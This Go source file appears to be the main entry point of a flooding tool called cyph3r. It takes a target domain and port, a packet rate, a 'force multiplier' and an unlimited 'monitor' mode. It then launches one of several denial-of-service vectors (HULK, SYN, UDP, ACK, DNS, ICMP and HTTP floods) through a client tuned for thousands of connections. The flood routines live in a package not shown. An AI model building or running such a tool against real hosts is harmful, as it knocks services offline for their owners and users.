package main

import (
	"context"
	"flag"
	"net/http"
	"time"
	"github.com/AnonPhoenix420/cyph3r/internal/intel"
	"github.com/AnonPhoenix420/cyph3r/internal/models"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

func main() {
	target := flag.String("t", "", "Target Domain")
	vector := flag.String("test", "", "Vector: HULK, SYN, UDP, ACK, DNS, ICMP, TCP, HTTP, HTTPS")
	port := flag.String("port", "443", "Target Port")
	pps := flag.Int("pps", 50, "Packets Per Second")
	power := flag.Int("power", 100, "Force Multiplier")
	monitor := flag.Bool("monitor", false, "Infinite Mode")
	verbose := flag.Bool("v", false, "Enable Verbose Output")

	flag.Parse()
	output.Banner()
	if *target == "" { flag.Usage(); return }

	data, _ := intel.GetTargetIntel(*target)
	output.DisplayHUD(data, *verbose)

	if *vector != "" {
		ctx := context.Background()
		if !*monitor {
			var cancel context.CancelFunc
			ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
			defer cancel()
		}

		transport := &http.Transport{
			MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000,
			IdleConnTimeout: 30 * time.Second, DisableKeepAlives: false,
		}
		httpClient := &http.Client{Transport: transport, Timeout: 1 * time.Second}

		intel.RunTacticalTest(models.TacticalConfig{
			Target: *target, Vector: *vector, PPS: *pps, Port: *port, Power: *power,
		}, ctx, httpClient)
	}
}
